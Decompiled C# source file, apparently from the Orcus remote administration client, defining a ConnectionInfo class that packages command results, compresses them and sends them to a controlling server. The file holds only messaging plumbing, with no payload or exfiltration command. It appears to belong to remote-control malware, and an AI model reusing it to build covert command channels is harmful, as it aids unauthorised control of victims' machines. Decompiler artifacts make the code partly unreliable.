using System;
using System.IO;
using Orcus.Connection;
using Orcus.Plugins;
using Orcus.Shared.Communication;
using Orcus.Shared.Compression;
using Orcus.Shared.Connection;
using Orcus.Shared.Data;

namespace Orcus.CommandManagement;

public class ConnectionInfo : IConnectionInfo
{
	private readonly object _sendLock;

	private bool _isFailed;

	public ServerConnection ServerConnection { get; }

	public IClientInfo ClientInfo { get; }

	public IConnectionInitializer ConnectionInitializer { get; }

	public ushort AdministrationId { get; }

	public event EventHandler Failed;

	public ConnectionInfo(ServerConnection connection, ushort administrationId, IClientInfo clientInfo, IConnectionInitializer connectionInitializer)
	{
		ServerConnection = connection;
		AdministrationId = administrationId;
		_sendLock = connection.SendLock;
		ClientInfo = clientInfo;
		ConnectionInitializer = connectionInitializer;
	}

	public void CommandFailed(Command command, byte[] data)
	{
		byte[] array = new byte[5 + data.Length];
		Array.Copy(BitConverter.GetBytes(command.get_Identifier()), array, 4);
		array[4] = 0;
		Array.Copy(data, 0, array, 5, data.Length);
		Response(array, (ResponseType)1, (PackageCompression)0);
	}

	public void CommandSucceed(Command command, byte[] data)
	{
		byte[] array = new byte[5 + data.Length];
		Array.Copy(BitConverter.GetBytes(command.get_Identifier()), array, 4);
		array[4] = 2;
		Array.Copy(data, 0, array, 5, data.Length);
		Response(array, (ResponseType)1, (PackageCompression)0);
	}

	public void CommandWarning(Command command, byte[] data)
	{
		byte[] array = new byte[5 + data.Length];
		Array.Copy(BitConverter.GetBytes(command.get_Identifier()), array, 4);
		array[4] = 1;
		Array.Copy(data, 0, array, 5, data.Length);
		Response(array, (ResponseType)1, (PackageCompression)0);
	}

	public void CommandResponse(Command command, byte[] data, PackageCompression packageCompression = 0)
	{
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		byte[] array = new byte[4 + data.Length];
		Array.Copy(BitConverter.GetBytes(command.get_Identifier()), array, 4);
		Array.Copy(data, 0, array, 4, data.Length);
		Response(array, (ResponseType)1, packageCompression);
	}

	public void UnsafeResponse(Command command, int length, Action<BinaryWriter> writeAction)
	{
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Expected O, but got Unknown
		UnsafeResponse(command, new WriterCall(length, writeAction));
	}

	public void UnsafeResponse(Command command, WriterCall writerCall)
	{
		if (_isFailed)
		{
			return;
		}
		lock (_sendLock)
		{
			try
			{
				ServerConnection.BinaryWriter.Write((byte)0);
				ServerConnection.BinaryWriter.Write(writerCall.get_Size() + 7);
				ServerConnection.BinaryWriter.Write(BitConverter.GetBytes(AdministrationId));
				ServerConnection.BinaryWriter.Write((byte)1);
				ServerConnection.BinaryWriter.Write(BitConverter.GetBytes(command.get_Identifier()));
				writerCall.WriteIntoStream(ServerConnection.BinaryWriter.BaseStream);
				ServerConnection.BinaryWriter.Flush();
			}
			catch (Exception)
			{
				OnFailed();
			}
		}
	}

	public void Response(byte[] package, ResponseType responseType, PackageCompression packageCompression = 0)
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Invalid comparison between Unknown and I4
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		if (_isFailed)
		{
			return;
		}
		byte[] array = null;
		bool flag = false;
		if ((package.Length > 75 && (int)packageCompression == 0) || (int)packageCompression == 1)
		{
			array = LZF.Compress(package, 0);
			if (package.Length > array.Length)
			{
				flag = true;
			}
		}
		lock (_sendLock)
		{
			try
			{
				ServerConnection.BinaryWriter.Write((byte)(flag ? 1u : 0u));
				ServerConnection.BinaryWriter.Write((flag ? array.Length : package.Length) + 3);
				ServerConnection.BinaryWriter.Write(BitConverter.GetBytes(AdministrationId));
				ServerConnection.BinaryWriter.Write((byte)responseType);
				ServerConnection.BinaryWriter.Write(flag ? array : package);
				ServerConnection.BinaryWriter.Flush();
			}
			catch (Exception)
			{
				OnFailed();
			}
		}
	}

	public void SendServerPackage(ServerPackageType serverPackageType, byte[] data, bool redirectPackage)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		ServerConnection.SendServerPackage(serverPackageType, data, redirectPackage, AdministrationId);
	}

	protected void OnFailed()
	{
		_isFailed = true;
		this.Failed?.Invoke(this, EventArgs.Empty);
	}
}
